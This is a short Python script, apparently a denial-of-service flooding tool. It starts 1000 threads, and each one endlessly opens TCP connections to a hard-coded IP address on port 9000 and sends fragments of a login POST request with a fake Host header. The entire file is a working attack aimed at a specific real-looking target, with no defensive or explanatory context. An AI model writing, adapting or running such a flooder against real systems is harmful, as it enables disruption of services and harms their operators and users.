import threading
import socket

target = '27.147.170.200'
port = 9000
fakeIp = '54.55.56.57'

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("POST /api/user/login HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(('HOST: "' + fakeIp + '\r\n\r\n').encode('ascii'), (target,port))
        s.close()

        global already_connected
        already_connected += 1
        if (already_connected % 500 == 0):
            print(already_connected)


for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()